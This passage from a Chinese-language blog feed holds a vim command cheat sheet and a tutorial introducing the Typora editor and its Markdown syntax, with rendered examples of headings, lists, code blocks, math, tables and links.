      <link href="/article/2021-08-21-vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/article/2021-08-21-vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>主要介绍vim常用命令。</p><span id="more"></span><h2 id="1-切换模式"><a href="#1-切换模式" class="headerlink" title="1.切换模式"></a>1.切换模式</h2><p><code>i</code> → Insert 模式，在光标前插入</p><p><code>ESC</code> → 回到 Normal 模式，Normal 模式下，所有键都是功能键</p><p><code>:help &lt;command&gt;</code> → 显示相关命令的帮助。你也可以就输入 :help 而不跟命令。（退出帮助需要输入:q）</p><h2 id="2-存盘-amp-退出"><a href="#2-存盘-amp-退出" class="headerlink" title="2.存盘 &amp; 退出"></a>2.存盘 &amp; 退出</h2><p><code>:e file</code> → 打开一个文件</p><p><code>:w</code> → 存盘</p><p><code>:saveas file</code> → 另存为</p><p><code>:x</code>， <code>ZZ</code> 或 <code>:wq</code> → 保存并退出 (:x 表示仅在需要时保存，ZZ不需要输入冒号并回车)</p><p><code>:q!</code> → 退出不保存</p><p><code>:qa!</code> 强行退出所有的正在编辑的文件，就算别的文件有更改。</p><p><code>:bn</code> 和 <code>:bp</code> → 你可以同时打开很多文件，使用这两个命令来切换下一个或上一个文件。（<code>:n</code>到下一个文件）</p><h2 id="3-插入"><a href="#3-插入" class="headerlink" title="3.插入"></a>3.插入</h2><p><code>a</code> → 在光标后插入</p><p><code>o</code> → 在当前行后插入一个新行</p><p><code>O</code> → 在当前行前插入一个新行</p><p><code>cw</code> → 替换从光标所在位置后到一个单词结尾的字符</p><h2 id="4-删除"><a href="#4-删除" class="headerlink" title="4.删除"></a>4.删除</h2><p><code>x</code> → 删当前光标所在的一个字符。</p><p><code>dd</code> → 删除当前行，并把删除的行存到剪贴板里</p><p><code>d</code> →  删除，常用于组合</p><h2 id="5-拷贝-amp-粘贴"><a href="#5-拷贝-amp-粘贴" class="headerlink" title="5.拷贝 &amp; 粘贴"></a>5.拷贝 &amp; 粘贴</h2><p><code>yy</code> → 拷贝当前行当行于 ddP</p><p><code>p</code> → 粘贴(小写后)</p><p><code>P</code> → 粘贴(大写前)</p><p><code>y</code> → 拷贝，常用于组合</p><blockquote><p>vim有12个粘贴板，分别是<code>0 1 2 ... 9 a &quot; ＋</code>用<code>:reg</code>命令可以查看各个粘贴板里的内容，在vim中简单用<code>y</code>只是复制到<code>&quot;</code>粘贴板里，同样用<code>p</code>粘贴的也是这个粘贴板里的内容。</p><ul><li><p><code>&quot;Ny</code> 指定<code>N</code>粘贴板复制（主意引号）</p></li><li><p><code>+</code> 粘贴板是系统粘贴板，<code>&quot;+y</code>复制，<code>&quot;+p</code>粘贴</p></li></ul></blockquote><h2 id="6-定位"><a href="#6-定位" class="headerlink" title="6.定位"></a>6.定位</h2><p><code>hjkl</code>  (←↓↑→)</p><h3 id="6-1-行内定位"><a href="#6-1-行内定位" class="headerlink" title="6.1 行内定位"></a>6.1 行内定位</h3><p><code>0</code> → 数字零，到行头</p><p><code>^</code> → 到本行第一个不是blank字符的位置（所谓blank字符就是空格，tab，换行，回车等）</p><p><code>$</code> → 到本行行尾</p><p><code>g_</code> → 到本行最后一个不是blank字符的位置。</p><p><code>fa</code> → 到本行下一个为<code>a</code>的字符处</p><p><code>Fa</code> → 到本行上一个为<code>a</code>的字符处</p><p><code>ta</code> → 到<code>a</code>前的第一个字符</p><p><code>Ta</code> → 到<code>a</code>后的第一个字符</p><h3 id="6-2-行间定位"><a href="#6-2-行间定位" class="headerlink" title="6.2 行间定位"></a>6.2 行间定位</h3><p><code>NG</code> → 到第 <code>N</code> 行 （命令中的G是大写的）</p><p><code>:N</code> → 到第 <code>N</code> 行</p><p><code>gg</code> → 到第一行。（相当于1G，或 :1）</p><p><code>G</code> → 到最后一行。</p><h3 id="6-3-全文定位"><a href="#6-3-全文定位" class="headerlink" title="6.3 全文定位"></a>6.3 全文定位</h3><p><code>w</code> → 到下一个单词的开头。(默认单词形式)</p><p><code>e</code> → 到当前单词的结尾。(默认单词形式)</p><p><code>W</code> → 到下一个单词的开头。（包含空格<code>?</code>）</p><p><code>E</code> → 到当前单词的结尾。（包含空格<code>?</code>）</p><p><code>%</code> → 到匹配的括号处，包括 <code>(  &#123;  [</code>  （需要把光标先移到括号上）</p><p><code>*</code> →  到<code>下一个</code>匹配单词</p><p><code># </code> →  到<code>上一个</code>匹配单词</p><p><code>/pattern</code> → 搜索 <code>pattern</code> 的字符串（需要回车，如果搜索出多个匹配，可按<code>n</code>键到下一个）</p><h2 id="7-Undo-amp-Redo"><a href="#7-Undo-amp-Redo" class="headerlink" title="7.Undo &amp; Redo"></a>7.Undo &amp; Redo</h2><p><code>u</code> → undo</p><p><code>&lt;Ctrl-r&gt;</code>→ redo</p><h2 id="8-重复"><a href="#8-重复" class="headerlink" title="8.重复"></a>8.重复</h2><p><code>.</code> → (小数点) 可以重复<code>上一次</code>的命令</p><p><code>N &lt;command&gt;</code> → 重复某个命令<code>N次</code>，command可以为<code>.</code></p><blockquote><p>使用<code>.</code>时，若上一次的命令为<code>N &lt;command&gt;</code>，则原样执行<code>N &lt;command&gt;</code></p><p>使用<code>N &lt;command&gt;</code>时，若<code>command</code>为<code>.</code>，则<code>N</code>会覆盖<code>.</code>自带的次数</p></blockquote><h2 id="9-组合"><a href="#9-组合" class="headerlink" title="9.组合"></a>9.组合</h2><ul><li><code>&lt;start&gt;&lt;command&gt;&lt;end&gt;</code></li></ul><blockquote><p>例如</p><p><code>0y$</code> → 从行头拷贝到行尾</p><p><code>ye</code> → 从当前位置拷贝到本单词的最后一个字符</p><p><code>y2/foo</code> → 拷贝2个foo之间的内容</p></blockquote><h2 id="10-区域选择"><a href="#10-区域选择" class="headerlink" title="10.区域选择"></a>10.区域选择</h2><p><code>&lt;action&gt;Na&lt;object&gt;</code> 包括object</p><p><code>&lt;action&gt;Ni&lt;object&gt;</code> 不包括object</p><ul><li><p><code>action</code> 可以是任何的命令，如 d (删除), y (拷贝), v (可以视模式选择)。</p></li><li><p><code>object</code> 可能是： <code>w</code> 一个单词， <code>W</code> 一个以空格为分隔的单词， <code>s</code> 一个句字， <code>p</code> 一个段落；也可以是成对出现的字符：<code>&quot; &#39; ) &#125; ]</code></p></li><li><p><code>N</code> 表示选取第N层，不写默认为1</p></li></ul><h2 id="11-自动提示"><a href="#11-自动提示" class="headerlink" title="11.自动提示"></a>11.自动提示</h2><p><code>&lt;Ctrl-n&gt;</code> 或 <code>&lt;Ctrl-p&gt;</code></p><h2 id="12-宏录制"><a href="#12-宏录制" class="headerlink" title="12.宏录制"></a>12.宏录制</h2><p><code>qa</code>  → 把操作记录在寄存器 <code>a</code></p><p><code>q</code>  → 停止录制</p><p><code>@a</code>  → replay<code>a</code>寄存器中的宏。</p><p><code>@@</code>  → replay最新录制的宏。</p><blockquote><p>示例：</p><p>在一个只有一行且这一行只有“1”的文本中，键入如下命令：</p><p><code>qaYp&lt;C-a&gt;q</code></p><p><code>qa</code> 开始录制</p><p><code>Yp</code> 复制行.</p><p><code>&lt;Ctrl-a&gt;</code> 增加1.</p><p><code>q</code> 停止录制.</p></blockquote><p>这个宏的作用是：复制上一行并增加1</p><p>测试：</p><p>@a → 在1下面写下 2</p><p>@@ → 在2 正面写下3</p><p>现在做 100@@ 会创建新的100行，并把数据增加到 103.</p><h2 id="13-可视化选择"><a href="#13-可视化选择" class="headerlink" title="13.可视化选择"></a>13.可视化选择</h2><p><code>v</code> 可视</p><p><code>V</code> 可视行</p><p><code>&lt;Ctrl-v&gt;</code> 可视块</p><p>选择了可视化范围后，可做如下操作：</p><blockquote><ul><li><p><code>J</code> → 把所有的行连接起来（变成一行）</p></li><li><p><code>&lt;</code> → 左缩进</p></li><li><p><code>&gt;</code> → 右缩进</p></li><li><p><code>=</code> → 自动缩进</p></li></ul></blockquote><p>在所有被选择的行后加上点东西：</p><p><code>&lt;Ctrl-v&gt;</code></p><p>选中行</p><p><code>$</code> 到行最后（不加将在每行行首编辑）</p><p><code>A</code> 块操作中进入插入模式</p><p>输入</p><p><code>ESC</code></p><h2 id="14-分屏"><a href="#14-分屏" class="headerlink" title="14.分屏"></a>14.分屏</h2><p><code>split</code> → 创建分屏</p><p><code>vsplit</code> → 创建垂直分屏</p><p><code>&lt;Ctrl-w&gt;方向</code> → 方向可以是 hjkl 或 ←↓↑→，用来切换分屏。</p><p><code>&lt;Ctrl-w&gt;_ </code> → 最大化尺寸</p><p><code>&lt;Ctrl-w&gt;|</code> → 垂直分屏最大化尺寸</p><p><code>&lt;Ctrl-w&gt;+</code> → 增加尺寸</p><p><code>&lt;Ctrl-w&gt;-</code> → 减小尺寸</p><hr><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>帮助文档 → <code>:help usr_02.txt</code></p><p>gvim 启动设置（显示行号，配色，代码高亮）：</p><blockquote><p>编辑安装目录下<code>_vimrc</code>文件</p><p>添加如下代码</p><p>set nu!</p><p>colorscheme desert</p><p>syntax enable</p><p>syntax on</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora简介及Markdown语法精讲</title>
      <link href="/article/2021-09-02-Typora%E7%AE%80%E4%BB%8B%E5%8F%8AMarkdown%E8%AF%AD%E6%B3%95%E7%B2%BE%E8%AE%B2/"/>
      <url>/article/2021-09-02-Typora%E7%AE%80%E4%BB%8B%E5%8F%8AMarkdown%E8%AF%AD%E6%B3%95%E7%B2%BE%E8%AE%B2/</url>
      
        <content type="html"><![CDATA[<p>这篇文章简单介绍Typora这款Markdown语法编辑器，以及精讲它支持的Markdown语法。</p><span id="more"></span><h1 id="Typora"><a href="#Typora" class="headerlink" title="Typora"></a>Typora</h1><p>Typora的官网是<a href="https://www.typora.io/">https://www.typora.io/</a>，里面有详尽的介绍和展示，下面我摘取一些片段介绍一下该编辑器的特性。</p><p>用它进行Markdown文件的阅读和写作可以用“美”字来形容，具体体现在三大体验感中：</p><ul><li>自由随心</li><li>实时无缝预览</li><li>所见即所得</li></ul><p>喜欢它，因为它简约又强大。下面看下它的一些特性——</p><h3 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h3><p><img src="https://www.typora.io/img/new/image.png" alt="Images"></p><h3 id="生成标题"><a href="#生成标题" class="headerlink" title="生成标题"></a>生成标题</h3><p><img src="https://www.typora.io/img/new/toc.png" alt="Headers"></p><h3 id="生成列表"><a href="#生成列表" class="headerlink" title="生成列表"></a>生成列表</h3><p><img src="https://www.typora.io/img/new/lists.png" alt="Lists"></p><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><p><img src="https://www.typora.io/img/new/table.png" alt="Tables"></p><h3 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h3><p><img src="https://www.typora.io/img/new/fences.png" alt="Code Fences"></p><h3 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h3><p><img src="https://www.typora.io/img/new/math.png" alt="Math"></p><h3 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h3><p><img src="https://www.typora.io/img/new/diagram.png" alt="Diagrams"></p><h3 id="行内样式"><a href="#行内样式" class="headerlink" title="行内样式"></a>行内样式</h3><p><img src="https://www.typora.io/img/new/inline.png" alt="Inline Style"></p><p>除此之外，它可以方便地管理md文件，在文章标题间快速跳转，支持YAML头信息，导入和输出成通用的文件格式。</p><p><img src="https://www.typora.io/img/new/files.png" alt="管理文件"></p><p><img src="https://www.typora.io/img/new/import-export.png" alt="导入和导出"></p><p>还有大量我完全没用过的特性，像支持其他插件进行扩展、修改主题、自动匹配等等。关键是开发团队还在不断地维护和开发这个软件，并且我们可以免费使用它。我之前也用过不少的Markdown语法编辑器，这个是我一用上就离不开的，无论是在Windows上还是Ubuntu上，我都可以用它进行快速流畅的文档创作（当然它也支持Mac）。</p><p>它对英文字体支持非常棒，看起来很舒服。可惜在Windows上对中文字体的显示不太友好，看起来有点丑。好像可以更换字体，不过没有尝试过。</p><h1 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h1><p>之前推荐过Markdwon的语法介绍，像我在Github上fork的<a href="https://github.com/ShixiangWang/README">https://github.com/ShixiangWang/README</a>。当然百度也能搜出大量的该语法介绍。这里我想根据Typora官方提供的Markdown参考精讲一下它支持的语法特性。</p><h2 id="块元素"><a href="#块元素" class="headerlink" title="块元素"></a>块元素</h2><h3 id="段落和换行符"><a href="#段落和换行符" class="headerlink" title="段落和换行符"></a>段落和换行符</h3><p>在Markdown源码中需要多个空行才能重启一段，Typora中只需要按下<code>Enter</code>键即可。</p><p>按下<code>Shift</code>+<code>Enter</code>键会创建一个单个换行符，但是大多数Markdown语法解析器都会忽略它。我们可以通过在一行的末尾加两个空格键，或者插入<code>&lt;br/&gt;</code>。</p><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><p>在一行的开始加1-6个井号键，对应着文章的1-6级标题。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 这是一级标题</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 这是二级标题</span></span><br><span class="line"></span><br><span class="line"><span class="section">###### 这是六级标题</span></span><br></pre></td></tr></table></figure><p>一般建议标题不要超过三级，不然可能层级太多影响阅读。</p><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>Markdown用<code>&gt;</code>代表引用，格式看起来如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt; This is a blockquote with two paragraphs. This is first paragraph.</span></span><br><span class="line"><span class="quote">&gt;</span></span><br><span class="line"><span class="quote">&gt; This is second pragraph.Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.</span></span><br></pre></td></tr></table></figure><blockquote><p>This is a blockquote with two paragraphs. This is first paragraph.</p><p>This is second pragraph.Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.</p></blockquote><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p><code>*</code>和<code>+</code>，<code>-</code>三种字符都能用来创建无序列表，但最好不要混用。有序列表用数字加<code>.</code>号即可创建。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">## un-ordered list</span></span><br><span class="line"><span class="bullet">*</span>   Red</span><br><span class="line"><span class="bullet">*</span>   Green</span><br><span class="line"><span class="bullet">*</span>   Blue</span><br><span class="line"></span><br><span class="line"><span class="section">## ordered list</span></span><br><span class="line"><span class="bullet">1.</span>  Red</span><br><span class="line"><span class="bullet">2.</span> Green</span><br><span class="line"><span class="bullet">3.</span>Blue</span><br></pre></td></tr></table></figure><p>un-ordered list</p><ul><li>  Red</li><li>  Green</li><li>  Blue</li></ul><p>ordered list</p><ol><li> Red</li><li> Green</li><li> 3.Blue</li></ol><h3 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h3><p>任务列表用[]或[x]标记（未完成或完成）。、</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> [ ] a task list item</span><br><span class="line"><span class="bullet">-</span> [ ] list syntax required</span><br><span class="line"><span class="bullet">-</span> [ ] normal <span class="strong">**formatting**</span>, @mentions, #1234 refs</span><br><span class="line"><span class="bullet">-</span> [ ] incomplete</span><br><span class="line"><span class="bullet">-</span> [x] completed</span><br></pre></td></tr></table></figure><ul><li><input disabled="" type="checkbox"> a task list item</li><li><input disabled="" type="checkbox"> list syntax required</li><li><input disabled="" type="checkbox"> normal <strong>formatting</strong>, @mentions, #1234 refs</li><li><input disabled="" type="checkbox"> incomplete</li><li><input checked="" disabled="" type="checkbox"> completed</li></ul><p>在Typora中直接可以点击来修改任务完成的状态。</p><h3 id="代码块-1"><a href="#代码块-1" class="headerlink" title="代码块"></a>代码块</h3><p>Typora只支持Github的Markdown语法，对源代码块（Markdown有不同的种类，所以有些地方不太一样）不支持。</p><p>Typora中只需要键入```并按下Enter键就可以输入代码块了。在```后面可以加上你使用的语言名。Typora会自动进行语法高亮。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Here&#x27;s an example:</span><br><span class="line"></span><br><span class="line">​<span class="code">```</span></span><br><span class="line"><span class="code">function test() &#123;</span></span><br><span class="line"><span class="code">  console.log(&quot;notice the blank line before this function?&quot;);</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">​```</span></span><br><span class="line"></span><br><span class="line">syntax highlighting:</span><br><span class="line">​<span class="code">```ruby</span></span><br><span class="line"><span class="code">require &#x27;redcarpet&#x27;</span></span><br><span class="line"><span class="code">markdown = Redcarpet.new(&quot;Hello World!&quot;)</span></span><br><span class="line"><span class="code">puts markdown.to_html</span></span><br><span class="line"><span class="code">​```</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function test() &#123;</span><br><span class="line">  console.log(&quot;notice the blank line before this function?&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>语法高亮:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;redcarpet&#x27;</span></span><br><span class="line">markdown = <span class="title class_">Redcarpet</span>.new(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">puts markdown.to_html</span><br></pre></td></tr></table></figure><h3 id="数学公式块"><a href="#数学公式块" class="headerlink" title="数学公式块"></a>数学公式块</h3><p>我们可以使用<strong>MathJax</strong>语法输入<em>LaTex</em>数学公式。</p><p>用一个<code>$</code>开始和结尾会生成行内公式。而用<code>$$</code>开始和结尾并单独生成公式块。</p><p>$$<br>\mathbf{V}_1 \times \mathbf{V}_2 =  \begin{vmatrix}<br>\mathbf{i} &amp; \mathbf{j} &amp; \mathbf{k} \<br>\frac{\partial X}{\partial u} &amp;  \frac{\partial Y}{\partial u} &amp; 0 \<br>\frac{\partial X}{\partial v} &amp;  \frac{\partial Y}{\partial v} &amp; 0 \<br>\end{vmatrix}<br>$$</p><p>比如我们如果要生成如上公式，需要输入</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\mathbf&#123;V&#125;<span class="emphasis">_1 \times \mathbf&#123;V&#125;_</span>2 =  \begin&#123;vmatrix&#125; </span><br><span class="line">\mathbf&#123;i&#125; &amp; \mathbf&#123;j&#125; &amp; \mathbf&#123;k&#125; \\</span><br><span class="line">\frac&#123;\partial X&#125;&#123;\partial u&#125; &amp;  \frac&#123;\partial Y&#125;&#123;\partial u&#125; &amp; 0 \\</span><br><span class="line">\frac&#123;\partial X&#125;&#123;\partial v&#125; &amp;  \frac&#123;\partial Y&#125;&#123;\partial v&#125; &amp; 0 \\</span><br><span class="line">\end&#123;vmatrix&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><h3 id="表格-1"><a href="#表格-1" class="headerlink" title="表格"></a>表格</h3><p>输入 <code>| First Header  | Second Header |</code> 并按下 <code>Enter</code> 键会返回两列的表。</p><p>一旦表格生成，我们可以像使用Excel一样对表格进行对齐、添加、修改、删除操作。</p><p>本身的源代码是这样的：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| First Header  | Second Header |</span><br><span class="line">| ------------- | ------------- |</span><br><span class="line">| Content Cell  | Content Cell  |</span><br><span class="line">| Content Cell  | Content Cell  |</span><br></pre></td></tr></table></figure><p>看看效果:</p><table><thead><tr><th>First Header</th><th>Second Header</th></tr></thead><tbody><tr><td>Content Cell</td><td>Content Cell</td></tr><tr><td>Content Cell</td><td>Content Cell</td></tr></tbody></table><p>可以用<code>:</code>符号进行对齐操作。</p><p>比如：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| Left-Aligned  | Center Aligned  | Right Aligned |</span><br><span class="line">| :------------ |:---------------:| -----:|</span><br><span class="line">| col 3 is      | some wordy text | $1600 |</span><br><span class="line">| col 2 is      | centered        |   $12 |</span><br><span class="line">| zebra stripes | are neat        |    $1 |</span><br></pre></td></tr></table></figure><p>它将显示成：</p><table><thead><tr><th align="left">Left-Aligned</th><th align="center">Center Aligned</th><th align="right">Right Aligned</th></tr></thead><tbody><tr><td align="left">col 3 is</td><td align="center">some wordy text</td><td align="right">$1600</td></tr><tr><td align="left">col 2 is</td><td align="center">centered</td><td align="right">$12</td></tr><tr><td align="left">zebra stripes</td><td align="center">are neat</td><td align="right">$1</td></tr></tbody></table><h3 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You can create footnotes like this[^footnote].</span><br><span class="line"></span><br><span class="line">[<span class="symbol">^footnote</span>]: <span class="link">Here is the *text* of the **footnote**.</span></span><br></pre></td></tr></table></figure><p>第一行是文本，第二行是对标记字符进行解释。当把鼠标指向脚注时，会看到解释内容。</p><p>You can create footnotes like this[^footnote].</p><p>[^footnote]: Here is the <em>text</em> of the <strong>footnote</strong>.</p><h3 id="水平线"><a href="#水平线" class="headerlink" title="水平线"></a>水平线</h3><p>有时候我们想要水平线来进行文本内容分割，可以在空白行上使用<code>***</code>或者<code>---</code>然后按下回车键即可。</p><h3 id="YAML头信息"><a href="#YAML头信息" class="headerlink" title="YAML头信息"></a>YAML头信息</h3><p>Typora支持YAML头信息，一般网页需要写这个。在文档的开始键入<code>---</code>然后按下回车键就会生成一个独立的区块可以写入YAML头信息。</p><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p>输入<code>[toc]</code>并按下回车键会自动生成文章目录（这个在Github和简书上好像都不支持）。</p><h3 id="图解-1"><a href="#图解-1" class="headerlink" title="图解"></a>图解</h3><p>不翻译了，拷贝。</p><p>Typora supports, <a href="https://bramp.github.io/js-sequence-diagrams/">sequence</a>, <a href="http://flowchart.js.org/">flowchart</a> and <a href="https://knsv.github.io/mermaid/#mermaid">mermaid</a>, after this feature is enabled from preference panel.</p><p>See this <a href="http://support.typora.io/Draw-Diagrams-With-Markdown/">document</a> for detail.</p><h2 id="Span元素"><a href="#Span元素" class="headerlink" title="Span元素"></a>Span元素</h2><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>Markdown支持两种格式的链接：行内链接和参考链接。</p><p>两种链接中，文本信息都用<code>[]</code>限定。</p><p>常用的就是行内链接了，平常我们点击网址，然后浏览器会自动跳转并打开就属于这种。</p><p>它又分为有标题的和没标题的：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This is [<span class="string">an example</span>](<span class="link">http://example.com/ &quot;Title&quot;</span>) inline link.</span><br><span class="line"></span><br><span class="line">[<span class="string">This link</span>](<span class="link">http://example.net/</span>) has no title attribute.</span><br></pre></td></tr></table></figure><p>This is <a href="http://example.com/" title="Title">an example</a> inline link.</p><p><a href="http://example.net/">This link</a> has no title attribute.</p><h4 id="内部链接"><a href="#内部链接" class="headerlink" title="内部链接"></a>内部链接</h4><p>我们可以把链接指向文本的某个标题，这样就能够实现文章内部的跳转，像书签一样。</p><p>这个功能我没太摸清楚，参考的markdown文章中是能用的。有兴趣的可以看下，在下方留评。</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>两个<code>[]</code>，第一个写文本信息，第二个写链接ID。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This is [<span class="string">an example</span>][<span class="symbol">id</span>] reference-style link.</span><br><span class="line"></span><br><span class="line">Then, anywhere in the document, you define your link label like this, on a line by itself:</span><br><span class="line"></span><br><span class="line">[<span class="symbol">id</span>]: <span class="link">http://example.com/  &quot;Optional Title Here&quot;</span></span><br></pre></td></tr></table></figure><p>This is <a href="http://example.com/" title="Optional Title Here">an example</a> reference-style link.</p><p>Then, anywhere in the document, you define your link label like this, on a line by itself:</p><p>这就像写文章的参考文献一样。</p><p>有趣的是第二个方括号内内容可以省略，第一个方括号内内容会当作ID使用。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">Google</span>][<span class="symbol"></span>]</span><br><span class="line">And then define the link:</span><br><span class="line"></span><br><span class="line">[<span class="symbol">Google</span>]: <span class="link">http://google.com/</span></span><br></pre></td></tr></table></figure><p><a href="http://google.com/">Google</a><br>And then define the link:</p><h3 id="URLs"><a href="#URLs" class="headerlink" title="URLs"></a>URLs</h3><p>直接用<code>&lt;&gt;</code>可以插入网址。</p><p><code>&lt;i@typora.io&gt;</code> becomes <a href="mailto:&#x69;&#x40;&#116;&#121;&#112;&#x6f;&#x72;&#97;&#46;&#x69;&#x6f;">&#x69;&#x40;&#116;&#121;&#112;&#x6f;&#x72;&#97;&#46;&#x69;&#x6f;</a>.</p><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p>插入图片与插入链接相似，不过要在最前面加<code>!</code>做区别。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">Alt text</span>](<span class="link">/path/to/img.jpg</span>)</span><br><span class="line"><span class="section"># 左边是图片标题，右边是地址，可以是url，也可以是本地的图片地址（注意绝对路径和相对路径的区别，可以在Typora中设定）</span></span><br><span class="line">![<span class="string">Alt text</span>](<span class="link">/path/to/img.jpg &quot;Optional title&quot;</span>)</span><br></pre></td></tr></table></figure><p>比如我在文章最前面插的那些图片：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">Images</span>](<span class="link">https://www.typora.io/img/new/image.png</span>)</span><br></pre></td></tr></table></figure><p>效果就是</p><p><img src="https://www.typora.io/img/new/image.png" alt="Images"></p><h3 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h3><p>有时候我们需要对文本进行强调，方式是斜体。可以用<code>*</code>或<code>_</code>分隔要强调的文本。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="emphasis">*single asterisks*</span></span><br><span class="line"></span><br><span class="line"><span class="emphasis">_single underscores_</span></span><br></pre></td></tr></table></figure><p>输出: </p><p><em>single asterisks</em></p><p><em>single underscores</em></p><p>它们是可以和引用，以及后面讲的加粗连用的。</p><p>如果我们需要输出<code>*</code>键，可以用<code>\</code>进行转义。</p><h3 id="加粗"><a href="#加粗" class="headerlink" title="加粗"></a>加粗</h3><p>强调用一个符号，加粗用两个。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="strong">**double asterisks**</span></span><br><span class="line"></span><br><span class="line"><span class="strong">__double underscores__</span></span><br></pre></td></tr></table></figure><p><strong>double asterisks</strong></p><p><strong>double underscores</strong></p><p>Markdown一般都推荐使用<code>*</code>作为分隔符。</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>加入行内代码，只需要用`分隔即可。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Use the <span class="code">`printf()`</span> function.</span><br></pre></td></tr></table></figure><p>Use the <code>printf()</code> function.</p><h3 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h3><p>文本前后用两个<code>~</code>符号：</p><p><code>~~Mistaken text.~~</code> becomes <del>Mistaken text.</del></p><h3 id="下划线"><a href="#下划线" 